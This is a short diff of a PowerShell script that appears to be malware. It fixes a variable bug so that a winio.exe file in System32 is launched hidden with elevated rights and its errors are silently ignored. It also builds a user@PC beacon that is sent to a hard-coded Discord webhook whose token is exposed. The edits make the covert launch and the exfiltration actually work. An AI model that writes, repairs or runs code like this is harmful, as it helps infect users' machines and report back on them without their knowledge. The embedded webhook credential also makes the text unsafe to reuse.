@@ -30,7 +30,7 @@ foreach ($process in $processes)
 }
 
 $filePath = "C:\\Windows\\System32\\winio.exe";
-if (Test-Path $filePath2) {
+if (Test-Path $filePath) {
     try {
         Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
     } catch {}
@@ -47,7 +47,7 @@ if (Test-Path $filePath2) {
 }
 
 $webhookUrl = "https://discord.com/api/webhooks/1277401036809572475/_pXb-6v9wYFAUxRHWpukoPbaRekI0ehKgaNrL0kBWPB1-m504z1fxkHMQAzpFE9be_cc";
-$user = $env:USERNAME;
+$user = $env:USERNAME.TrimEnd('$');
 $pcName = $env:COMPUTERNAME;
 $message = "$user@$pcName";
 $payload = @{
